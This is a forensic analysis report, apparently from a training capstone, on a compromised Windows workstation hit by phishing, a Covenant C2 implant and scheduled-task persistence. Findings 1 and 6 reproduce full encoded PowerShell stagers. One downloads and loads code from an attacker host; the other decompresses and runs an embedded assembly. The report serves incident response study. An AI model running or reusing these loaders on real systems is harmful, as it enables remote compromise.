# Forensic Analysis of WKST02 Collections

**TimeLine:**

| Timestamp | Activity |
| -- | -- |
| ??/??/???? ??:??:?? | powershell.exe PID: 7036 Connected to 3.132.192.16 (malwarelove[.]xyz) |
| 02/09/2022 01:58:25 +0000 | Malicious Document Sent ia Email: MagnumTempus-Policy-Violation-karen.metuens@magnumtempusfinancial.com.doc |
| 02/09/2022 03:12:57 +0000 | Malicious Document Sent ia Email: MagnumTempus-Policy-Violation-karen.metuens@magnumtempusfinancial.com.doc |
| 02/09/2022 23:26:38 +0000 | Malicious Document Sent ia Email: MagnumTempus-Policy-Violation-karen.metuens@magnumtempusfinancial.com.doc |
| 02/09/2022 23:35:18 +0000 | Malicious Document Sent ia Email: MagnumTempus-Policy-Violation-karen.metuens@magnumtempusfinancial.com.doc |
| 02/10/2022 02:14:00 +0000 | Malicious Document Sent ia Email: MagnumTempus-Policy-Violation-karen.metuens@magnumtempusfinancial.com.doc |
| 02/11/2022 04:40:34 +0000 | Malicious Document Sent ia Email: MagnumTempus-Policy-Violation-karen.metuens@magnumtempusfinancial.com.doc |
| 02/12/2022 21:10:06 +0000 | Malicious Document Sent ia Email: MagnumTempus-Policy-Violation-karen.metuens@magnumtempusfinancial.com.doc |
| 02/12/2022 21:11:41 +0000 | Powershell Encoded Malware Executed |
| 02/12/2022 21:12:37 +0000 | Local Accounts Discovery, Whoami Execution: "C:\Windows\system32\whoami.exe" |
| 02/12/2022 21:13:46 +0000 | Net.exe Execution: C:\Windows\system32\net.exe localgroup Administrators |
| 02/12/2022 21:15:59 +0000 | Suspicious File: C:\Windows\Temp\cleanup.exe Malware Created |
| 20160716-022321 | Persistence (Daily MagnumTempus IT Cleanup) for cleanup.exe added to Task Scheduler |
| 02/12/2022 21:33:26 +0000 | Suspicious File: C:\Windows\Temp\p.exe (PingCastle) Created |
| 02/12/2022 21:34:15 +0000 | Suspicious File: C\Windows\Temp\met64.exe (Metasploit) Created |
| 02/12/2022 21:38:59 +0000 | Net.exe Execution: C:\Windows\System32\net.exe net accounts /domain
| 02/12/2022 21:39:00 +0000 | Net.exe Execution: C:\Windows\System32\net.exe net accounts /domain
| 02/12/2022 22:00:45 +0000 | Suspicious Shells Spawn by WinRM, Covenant Launcher Indicators, Base64 Encoded Powershell Malware |
| 02/12/2022 22:51:31 +0000 | Suspicious (Password) File: C:\Users\karen.metuens\Desktop\hotmail password.docx Accessed |
| 02/12/2022 23:12:23 +0000 | Suspicious File: C:\Windows\Temp\leavemehere.dat (Obfuscated version of the original loader: uses syscalls) Created |

---

**Conclusion:** Karen Metuens received several emails with a malicious document attachment (MagnumTempus-Policy-Violation-karen.metuens@magnumtempusfinancial.com.doc). There is no clear indication that she opened it - however a malicious Powershell script associated with the actor was executed (PID 7036) that communicated with a C2 server (https://malwarelove[.]xyz/index-en-US.html / 3.132.192[.]16). The malicious Powershell was detected as: VirTool:MSIL/Covent.C by Windows Defender. Recommend that Karen be interviewed to see if she remembers opening the attachment.

---

**Finding 1:** (2022-02-12 21:11:41) Powershell Encoded Malware in: Sysmon Event Log

```
Powershell -exec bypass -nologo -nop -w hidden -enc
KAAgAG4ARQB3AC0AbwBiAGoARQBD
AFQAIABJAG8ALgBzAHQAcgBFAEEAbQBSAEUAQQBk
AGUAcgAoACAAKABuAEUAdwAtAG8AYgBqAEUAQwBU
ACAASQBvAC4AYwBvAG0AUABSAGUAcwBTAGkATwBu
AC4AZABFAGYAbABBAHQAZQBzAFQAcgBlAEEAbQAo
ACAAWwBzAFkAUwB0AGUATQAuAEkAbwAuAE0AZQBt
AE8AcgBZAHMAdAByAEUAQQBNAF0AIABbAEMAbwBu
AFYAZQBSAFQAXQA6ADoARgBSAG8AbQBiAEEAUwBF
ADYANABzAHQAcgBpAG4ARwAoACAAJwBYAFYAYgBM
AGIAbABRADUARQBQADIAVgBXAG8AQQA2AEwAUgB4
AGsAWAA3ACsAWABJAEcAVQBCAEMAMABDAEIAeABV
AGgAUgBOAEUASQBvAFEARABaAEIAQQBzAFMARwBt
AFgAKwBuAFQAagAxADgAYgA1AEMAZwB1ADIATwBY
ADYAMwBGADgANgBwAFQAcABPAFYAMwBRAHgAYwAy
AFAARAA5AGYAMwBiADcANwBjAFAAdgBsADEAOQBm
ADMAbAAyAC8AZABYADcANgA3AHYAUABsADkAZAAz
AHoAMQA4AHUAagB2AGYAcABKAEIAdgBuADUAMwAr
AE8AVgAyACsAZgBuAHYALwA1AG4AUQA2AHcANQA0
AHUAWgBxAEoAQQBmAGYAQgBIAGkAdgBpAFoAVQBx
AE4AUQBXAGgAaABaAGwAMABKAEsAUgBaAFkASAAv
AHEAeQBCADUAcgBTAE4ARQBZAGsAMwBrAHkAMgBu
AEYAUABVADAAZQArAHQAaABkAHUAeABGAHQAdQA1
AGkAegBjADcAYwBQAFgAdQBiAE8AVgBEAGwAawBI
AFYAdwBtAEUATQBVAEIARgBsAG0AZwBWAHIAZgBr
AHkAcQBlAG0AZwBhAEwAbQAvAHgAaQBWADUAeQBO
AHgAdABCAE4AVABtAGMAMABoAEkAWABSAFUAQgB2
ACsARgBXAEUAVgBrAEoAMgBzAEkARwAxAEoAdQBI
AFgAWgBNAEYAdABPAGEAUQA1AFoAZwBOAHMAVQBl
AFQATgB6AG8ASgBiAGsASwAyADIAYwBhADAAWQBV
AEYAQwBrAFoAcAB0AFEAMQBaAHQAcgBZAGEAdwBV
AHkATQBPAEQAMQBLAFMANABhAEoAOQAvAEgAWABz
AFUATQBWAEoAQgBRAGgAKwBWAEUAeQBHAGEAYgBj
ADEAbwBKAGUAVgBOAE0AdABvAFIAQQAxAFQAQQBW
AG0AeABTAG4AWABBADEAZgBsAHkAMwB3AFQAdQBF
AHoAdwA0AEYAQwA5AG8AQgBOAFMAaQBFAHYAWABt
AE4ASAB6AGIAdgBPADgAQwBoAEYAWQBvAGQAOQBV
ADMAKwBBAEsARQBZADcANABwAGgAWAB0AGEARgBt
AFMAQgBxAGMAVgBQAGcARAAvAHkAbQB6AGwAMQBI
AGQAVgB1AEcAUQBzAHgAbgBsAFoAagBYAFEAdQBs
AHMATgB3AGcAVwBzADYATQA0AEsASgBtAFIAcQB0
AHMAVQByAHAAUgB6AGMAZwAxAEsAawBYAE4AdgA4
ADUAcQBWAEcAMwBCAHYAdQByAC8AUgBRAHMAeQBT
AEsAagA2AEcAbgBTAHIAYgBqAGoASwBtADQARwB0
ADIAdgBQADYANQBhAGgAQQBrAEMAZgBnADIAYQBh
AE4AWgB2AFAAZwBTAGcAYQBVAGcAcABHADMAWgBR
AHoAeQBDAEIASABOAC8AQQBVAG4AWQBVAGYAMgAr
AEMAeQBnAGYAcQBCAGoAbwBnAE0ARwBlAE0AWQBK
AFgAWgBVAGoAZgBIAEkAaABzADYAZABTAHIARABI
AHEAZQByADMARABLAE0AYgBHAEUARQBRADEATwBP
AGoAWQBVAHUAQQBBAHUAMQBJADQAQgB3AFkANgAv
AGQAWQB5AFcAcABuADMAcQBDAHAAVABwAFkAagBQ
AE0AVgBJAHoAdgBRADQASwBQAHcARgBnADEASABy
AGgAbQBsAHIAcQBOAFkATABKAFAAQwA4AFcANAAx
AHAAaABrAFUAdwA2ADcASABoAFUAbQB4AEYAawBm
AFQAKwBpADEARwBEAGMAUABYAFYAbwBSAGUASABp
AFIAcAB4AG8ASgBzAHMANQBaAEIAcABuAEsAeABx
AGoAZwBsAFMASgBxAEsASwAvAGMASgArAGwATgBV
AEQASgBLAEYAdgArAFUAdQByAFcAdgBRAE4ATQBw
AGYAYgBaAHEARAB3AEcAbgBUAG8AQQAvADUAQgBy
AGQAZABvAEwATAAwADkAVwBKAHkAMQBRADYAYwB1
AEIAMABXAEwARwBEAGYAbABrAHgASgBTAFMASQBn
AG8AZwBSAEQAdwByAHIAbgBPAFQAUgBsADEANABw
AGsAWgBKAEQAZQBQAGoAWQBpAHEAYQBwAEsASwA4
AGUARAAzAEIAbABTAFkAbwAvAE4AMQB2AGQATgBL
AFMAMQBxAGkAUwA2ADkAMQBoAGsAaQB1AGkAWQBC
AG4ARAA1AEUAYQBLAFoAZwA2AEsAeQBlAEYAbgB0
AEYANABDAEEAcwBhADgAbABRADgAcABDAHUAUQBK
AEUAOABwAEEAdABUAHAAUwBXADMASwBqADYAcQAr
AFMASgBvADAAYwA2AFIAbwBhAGMAUQBVAGgAdgBt
AEIAZgBDAEoATABwAHMARQBpADgAdQAvAGsAagBD
AEEARgBBADEASgBwAEEATQBKAEEAOABMAHYANABT
ADgAawBiAEQAagBvAG4AVgBqAEIAMABtAHoATgA0
AEQARgBkAEoANQBFAEcAQwBXAGsANgB4AEIAeABr
AFkAeABOAG8AcgBEAGIAWABVAEIAMQA4AHAAdABF
AHEAVwBEADQAeABsAFoAKwBxAEkAMQByAHYATQBF
AGsALwB6AEsAQgBFAGgALwB5AEUANgBGAEQAVgBZ
AFQATQBVAFIAWgByAFQAbwBRAFMAMwBhADgAUQBK
AEEARQBZACsANQBoAFIAdQB6AHAAcABNAEgAdwBY
AG8AeABRAEQAOQAyAEsAeABxAHcAYgB4ADAAZABM
AFUAawBNAFUAVQB1AEgANgB1AFEAVQAyAFgAYQBM
AEYAVAAxADIAYwBVAEgAbQBlADgAQwA0AE4AWgBB
AGUAegAwAGIAVQBNAHEAQgAyADYANQBOAEoAbQBm
AFEANwBOAEsAZABuAGUARABPAFUAVwBtADEAUgBC
AHUAagBxAEsAcABxADYANgAwAGsAbwBWAGgAQQBS
AGsAYQBJAFQAQgBxAGUAawBBAFYAMwBYAEIAYgB0
AHAAegBGAGUAeAB3AGYAKwBTAFgAKwBoAEIAdwA4
AGoAbgBKAFoATwBpAEgAQwBzADUAdAA2ADcAdwBJ
AFIAbQBPAHgARABVAGgAMgBuAHkASQBiADMAcQBT
AEsAYgA0ADAAcAB0AFYAeAA3AFUAMQBsADkARgB5
AEIAaQBYAFIASQBCAHYAcAAwAGcAbgBlAEMATAAz
AHAAVABXAHYANwByAEgAbgBhADkARQBrAGoATgBa
AEQAcQBvAEEAeAAyAEMAVABPAFAATABMAEkAZQBn
AEcATgA3AGoAZgBsAHcAWABQAE4AVQA1AG4AdQBt
AHMAQgA1AG8AWQA3ADMAYQArAHIAcQA5AHEASgAy
AGgAagB3AFEAWABEAHgAQwB4AEYASgB0ADkAQQBL
ADUANwBOAFMAMgBzAGgAbABBACsANABvACsAcwA3
ADcAbwBtAGMAOQBzAG4ASgBoADUANwBPACsAUgBL
AHoAYgBKAGUASgBrAHIAMwBUAEUAYwBQAHQATAB2
AHcAWQBXAEEAVABnAGMANwAwAEgAegAzADkAegBZ
AC8AYwArADQAZQBmAHQALwBUAGsAMwA4AHUAUABQ
ACsAagBtADAAOQBjAFgAMwAyAC8AUAAvADkAUAA1
ADgAdgBXADMAVgB3ACsAbgBFADUAMwAvAEEAQQA9
AD0AJwAgACkALABbAEkATwAuAEMAbwBNAFAAcgBl
AFMAcwBJAG8AbgAuAEMATwBNAFAAUgBlAHMAUwBJ
AG8ATgBtAG8AZABFAF0AOgA6AGQARQBDAE8AbQBw
AHIAZQBzAFMAIAApACkALAAgAFsAVABlAHgAVAAu
AEUATgBDAG8AZABJAG4AZwBdADoAOgBhAFMAYwBJ
AGkAKQAgACkALgByAGUAQQBkAFQATwBlAG4AZAAo
ACAAKQAgAHwAIAAuACAAKAAgACQAUwBIAGUATABs
AEkARABbADEAXQArACQAcwBoAGUATABsAEkAZABb
ADEAMwBdACsAJwBYACcAKQA=
```

**CyberChef Recipe:**
```
From_Base64('A-Za-z0-9+/=',true)
Remove_null_bytes()
Regular_expression('User defined','[a-zA-Z0-9+/]{30,}',true,true,false,false,false,false,'List matches')
From_Base64('A-Za-z0-9+/=',true)
Raw_Inflate(0,0,'Adaptive',false,false)
Remove_whitespace(true,true,true,true,true,false)
Regular_expression('User defined','[0-9]{2,4}',true,true,false,false,false,false,'List matches')
From_Decimal('Line feed',false)
Find_/_Replace({'option':'Simple string','string':''+''},'',true,false,true,false)
Generic_Code_Beautify()
```

**Decoded Output:**
```
[Net.ServicePointManager]::ServerCertificateValidationCallback = {
$true
};
$wc = New - Object System.Net.WebClient;
$wc.Headers.Add(('User-Agent'), ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0'));
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$a = (New - Object net.webclient).DownloadData(('https://malwarelove.xyz/index-en-US.html'));
$b = [System.Reflection.Assembly]::Load($a);
```

---

**Finding 2:** Suspicious Files to Investigate Further

```
C:\Windows\Temp\met64.exe
- Metasploit
C:\Windows\Temp\cleanup.exe
- Grunt (Covenant agent) dropped for persistence 
C:\Windows\Temp\p.exe
- PingCastle
C:\Users\karen.metuens\Desktop\hotmail password.docx
- Contains a single line: degthegam3r@gmail.com
C:\Windows\Temp\leavemehere.dat
- An obfuscated version of the original loader that uses syscalls
```

---

**Finding 3:** cleanup.exe malware added to Task Scheduler for Persistence

```
Time: 20160716-022321
Entry Location: Task Scheduler
Entry: \Daily MagnumTempus IT Cleanup
Image Path: c:\windows\system32\cmd.exe
Launch String: "c:\windows\system32\cmd.exe /c start /B C:\windows\temp\cleanup.exe"
MD5: F4F684066175B77E0C3A000549D2922C
Enabled: enabled
```

---

**Finding 4:** Memory Analysis - IP Connections Information: Known Hostile IP: (https://malwarelove[.]xyz/index-en-US.html / 3.132.192[.]16) 

```
PID: 7036
Process: powershell.exe
Protocol: TCP
Local IP: 172.16.50.131
Local Port: 54354
Remote IP: 3.132.192.16
Remote Port: 443
Domain: malwarelove[.]xyz
Status: ESTAB
Path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

---

**Finding 5:** Likely Password File Access: (LNK File)

```
SourceFile: c:\AChoirX\Capstone-KC1-WKST02\Lnk\karen.metuens\AppData\Roaming\Microsoft\Office\Recent\hotmail password.LNK
LocalPath: C:\Users\karen.metuens\Desktop\hotmail password.docx
SourceCreate: 2022-03-23 00:37:29
SourceModify: 2022-02-12 22:51:31
SourceAccess: 2022-03-23 01:04:34
TargetCreate: 2022-02-12 22:51:31
TargetModify: 2022-02-12 22:51:31
TargetAccess: 2022-02-12 22:51:31
```

---

**Finding 6:** Suspicious Shells Spawn by WinRM, Covenant Launcher Indicators, Base64 Encoded Powershell Malware

```
"C:\Windows\System32\WindowsPowerShell\v
1.0\powershell.exe" -Sta -Nop -Window Hidden
-Command "sv o (New-Object IO.MemoryStream);
sv d (New-Object IO.Compression
.DeflateStream([IO.MemoryStream][Convert
]::FromBase64String('7Vp7cFzVef/O3d27V2t
7rbt62pbs9UP2WpaFXpZtsI31siUjyQ9JfuHU3se
VtHh37/reXVvCNRWFMoWEBJiSV0N5JDOBSciUJDN
AAjO4oQlNCAOdDoUWKGkeU0hmCm06eUxi9/ede1f
atWRS+k8m0+56v/O9zvc63zl7rldDx+8hDxF58bl
8megpcl676Xe/ZvAJrvpGkL5e9v3VT4nB768enUz
a4axlTljRdDgezWTMXDhmhK18JpzMhHv3j4TTZsJ
oXrIksM61caCPaFAo9NxaLVaw+zatoUWihagRhOL
wftIPEMbnlBtd2JF53TmFUQblzlFo958Rlct/c+P
sIF9/Abv7PyhJ+Fv8P6jFvBfi04pIDXR/Ed2cM6Z
yGH8WcXSLcy0ycarZMlJm3I3hlKvTVKq3m6j7fxM
iv15wg+qXpn10+2bUZwWRcFypH9ZepxLBnIASwYK
ojStt2FHXI7cVLSo9VSbt6vYSMAMW0GzN3cvBa6h
e1fRAxI95ETA3LVKt7ZBdQF96rY9eTesW+PE2bK5
Zf4sPyCVVh1EbHgINMyyJIPpNUnGx9Y9XteEvtRG
as+EvsbHE+o24mg2t1EbFnA2txEaF1/J4KBtZBJn
1HGNY1ECFz3p+Aa6qWpt8IFCqwAXU0ltMc9/bQVb
zW1vBrdAiS5laF1p3qRrThVnO1oYgsg4CmGyyelX
A1FmrzBphSyHGA9bjPH9RpIKpxfriGrMSmL641qy
Sox4wqyVi1vAQsGtZcUmYm9teBtxezoxgZAWLg9V
mHUaznnlLMWklc5dW60s/njRXMbNcX6KXm2FGdX1
R3d0+WVBd08siq8F8pKHGiqmUfaShVkb+SMMyWFn
DtV4rxcv1chdboesOFlnH1kLh99B+kQbg6iU1yIu
wnqdtYCCDC8mwuNBqRUVlRaWtMVapV9aYEZZXRjZ
y7I0SNzexbhMzNnMtOZiKKr/ZzL4atv0IvkINkWu
YWl9dsWHbXWBo+gazhZXHkUGkFVhTp16pr7fbgJY
VhDkIrSnVXRXrj9XiRTLROOqma+G/HdSswVKlsoX
ZZgdHvqHmaMUGfUOZuQXU9cnLly9zCLpX9+teyTM
7GSwwXy6AuRVgvb6+ouotz/q3OMdtYFxbDjtvBUM
Nl6qxKVeY2J6BN6orIttulWlHrky7HT6r3LQjV01
bLyvKuWM258hccK5G2QI8J9sIso3oETdby8m26ur
ZupNlqrpPr4hcy+LrmFIj6EW1WupWVDstU82bUTV
3SJZerS+SOg3LHKWahuUOUrtCjnqts6mWoceXyR6
XDRrZySXxvfkMtjE2VI1UMnc5u+p6HpZV68sKG2S
5HtSX15i7GV/hbMs6vc7dlnXutqzTVzjbss7ZlnV
mF29FZ28uvxt1FBX1kW4W1Zs9jobcivXVen3B00q
EuXL+VizjPXjXFXuwrnQPrlx4D65yqraqeKNVV2x
0u2TjB3XJxg/bJRsX6JL5PKdLNqJLNuob/yC65JM
43LG+xV1SN69L3CUOu+NqLFu4enmkl0X6ahfT66V
hPVxiv1PaL7SNbIrV1frqQlOsQVRrrtIUH//gpli
zcFOsdYq0trQpGt2maPygpmj8sE3RuEBTzOc5TdG
IpmjUG/8gmoJr9TubItLHwj0A1Z8198qhcnlhAau
wgOp5vlFhBXk5sXyPmLj1Bda/tb5iU2SAjW0y97l
rxPgNjA+yzSGAt6ixa9C5472MFnoN46Mwx88O7IK
vpX8D8AuMT4MZvOJeeG+Z88F3MstERYuHQoq8Y+q
eyDAX+T5e5k/PLvPnSslHmHy0QJYLj/VlJvZzgUI
OYX29WPxysZgJ67Vi8c+LxUxYvykW1/qLxExYYX+
ReEexmAmrt1h8qljMhDVZJLYPEN+QDwIG7EOAi1R
zhHO8nZVGedoK/5Usc4zBYQBXct985fuuqvzQfOW
Hrqr8lfnKX7mq8jPzlZ+5qvJ35yt/d76yv3Glch4
3Zm/jGsVzQSL7lMgRLpp9lJvSz88W18onDdXjNY+
Bx49PFS2K7C+0n654IsfBzuPrUgTUzZpLN6rOLPN
GDgp+5DbjMeSOqmOMbeE7mJ8r9ZqAcp6v3E3rFLm
D5AHobM2Q1zzBcUm+PMACqnKe7+snm9Sgt/oSnDc
227iOqzP8eNC4R54OHmcj73B8dY/s6xbyict5zjv
b0dzS3N7S3rqd5O5KAT6PuNbeQtSC3Fuwj9aO5Kx
kZsJmjVMw/xr4a8dGaFut83y7du/YQC8/14F+AcG
v7U6ZhQdskOJI1SNlZQEQvxbtVO0873G+/MDHz62
4eEg7yI7KnDpIHfe5UO574Y5eKjy6/pfiZKHSZ5W
PqCp9Q8I7lOvUpXSB607P+U94VTqqMIzRb8H5tJf
xY+pDmkqfJ4ajPoY94oR3Fb3DpyZFfCe8AXrY0+8
P0Dv+l/wqnYblAF30vQTO8x6WHtAY36WxtEt5FNK
XvAw/5n8X1v6c2Mt+H8N7oB+kb4keH3zJGP5TRnV
RRtKpMYx7OYb7BcM7JbzFzzDkOQ14Vkr/WsK7AAN
0XkZyWTB80fMuOKEyxr8sOU1ehu+qDCul5nve1UK
llwT7eltW4+cy65yM8IKM4VntLcClUtrmYzyiMPw
nOesV37cpQOc0ronXx3CnhGGl389r8E25EkK+y+k
B3wO+KokroH4IjS7gKv2pKKcHsYBV4C8iDyh8+Uh
qCXlWl9OvJOWjpdDuFwcVlVZ4xgC/5jkKWK+NKZ3
0JN2oVEN+EnCLhEnAA2yI7qgNoAME/ZGkPkl/551
Q5qjXlLSi0KSjSZ/Aeig01ejIrlPOQPZJ+X8dd2i
P+c4rXvorSd2qPevbBeqLTXMefPQNh6KPqZsUH70
oqedpSNuq+OlSk2PzSe86oZG62aGu0b6H3g5unrM
SoFpJ3UafoBklQAlJ3VtbrqaVYIlmkLKuZoC+IOa
oXaCWzlIWqHK5Cj9WGf5U7pSn/Yz/O29DesHDnE9
J6ecl/18kvlXCtI+ljRrvs9f4VKHPSZ3naQ6+jBw
CqiCdOK5lgAFqlfidEm6U8HV60z9JP6AbNRNnTEC
9C/h3/PfQ+/Qz8TikSfEE1vo65Un0BetHabd4BnN
v91yE9FOevyUhGj3fowE6qLxCZWJGvAqoet4E/LT
2I8C30U0HMfdHtFqwhWPA36WN4iv0H9Qqpjy/BP6
q+ltoblA9Yruo9ZaJLvFFT0i8Tl/yLxNl4u9plRD
iOs86cL7qbxQDYpe3VRwTHO2AeM+zTdxKDf7rxcN
UV9YLXCvbB3hJOyiSwu8/IqLiF+pHRCX9xHeTqKP
L/mngI95bYO1l7XbxGc4a+pb/E+JO8br/fkgXaX8
pumhcexD8fZ4vYFZMe0zcK9oVrthX/Y+Df8zzBCK
/2/M12HkDdsowcr41yOIYVWlPg3OPtko8jN1xEfB
VVOAx8W3tO+JpUSv+AfBB9Q1xUQyrPxSviGfEu+J
18YbvfXGGHhIX6QydEVzhL/l/IX4g/lXcJd4RvxS
a8jpd71+ivMO5g/OwJ6RUynWZpgl/rfK+GPGuVIT
yY+UiVVK9aFBuldJ7Xch74FbZ+48R75UnaBzruJo
20UWlGfv8HsAK+gzgCnpK2U1rwf+8lD4n4bckfFv
Ccrok2pRexSPP+4u+j2JXqsSUH/A2SghbeGeuuO7
RbVrR/8ny95DynhxLeSe883mV8qvEg773yv+RZG8
KuvtPcA496ijt2LX95Mn2ky20o2/KiOdzxkguOmF
Yu2Iud1f85MnepJ1NRad7UlHbdphyTuuCc1ppoC+
TTxtWNJYyTrXSYNLOYXDntC04p4325DPxUwsKqX+
oq2ekv6ttSydNGLmTY6N7trE12jFkJvIpYxf108i
0nTPSzQP7aUzqDBwm2xn2GhlEkjOAJqK5KKXtuGm
lkjFOrDCtx0yljHguaWbsZqmfjNOgGU1QVyKxkM5
I1ogno6nkzUaCho1ze/PJBO3oMc3TSaPHzOSiSZj
Ydfrkye5o/DTuFXuSRipBhwyUMG7I8JBd/PSoxSS
HiTwMOhBNJKAs8Z5kdtKwJMrqQ4ZtoxzUYxkJI5O
D655ofNKggcxZ87RBc9WmAV4p05Y4QrFNjEesZM4
YREzSFuKVeJ8dj2YNGkG1IZ8+YJk5M26mRqeZWUj
ZgpVoNpfHOGTkJs1Ed9Q2yPHBEVuAR7e0bO8xrFx
yPBlHnTlIHkZGu0YngSa6crhcxfIsMdPZZMqwCkt
SJOo1YvmJCQ77SvUol/yQkYpOScyekx/KoxRpg9U
giiVTSGNO6vYRdU/nnMQPR1N5g85KeC6WzEzl26a
aJ+PTzcaUswruAqCccVMiY7bBiR1IZjJM7rHMNOf
f2eFcF2nULCF7zXOZFLrGJceyRcReI8em+qP25Oz
ko+nULD6n5mIj+ZjtYEPRXHxSFgPpsAHgZ41MNDN
rkcasJGEV0WJpM2cULQZyTiZk3XqiqVQMTSczHTG
ss4b1wXrozow9blrpPclMNIULL3jDRu6caZ2ea0P
XWmkLORsQDeT2EYZ02kAy8a7UhAnNyTR12fN5nMo
cdSiaSZhpclt/Nhoa6LGmszlzjtFtosmjGdQpmXG
acZKxuIRuJx8yxt3NS8PRtCFbYW5D017LzGeL6CN
GrB+dixLN8fqm4kZWYs5OGMiMm87EghNsqzME5xY
dGulyouRCJ+MGKnM2CXMoV4aH7vz4OIaC1ExmckP
RDB94VHL8wT563MW5qlecMbL8V/JGjamc3PLOlD7
LMi1uLPeUyIFyajucT8dmNyO4zXEHysHZxb1GXOZ
RoLE1XBrNWci7NxmdyJh2Lhm32Y9THpu6DHu2/M5
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
9B/L/r9/H678B'),[IO.Compression.Compress
ionMode]::Decompress));sv b (New-Object
Byte[](1024));sv r (gv d).Value.Read(
(gv b).Value,0,1024);while((gv r).Value 
-gt 0){(gv o).Value.Write((gv b).Value,0,
(gv r).Value);sv r (gv d).Value.Read((gv b
).Value,0,1024);}[Reflection.Assembly]::
Load((gv o).Value.ToArray()).EntryPoint.
Invoke(0,@(,[string[]]@()))|Out-Null"
```

---

**Finding 7:** Defender Detected: VirTool:MSIL/Covent.C

```
Volatility3: CmdLine.dat: PID: 7036
PID: 7036
Process: powershell.exe

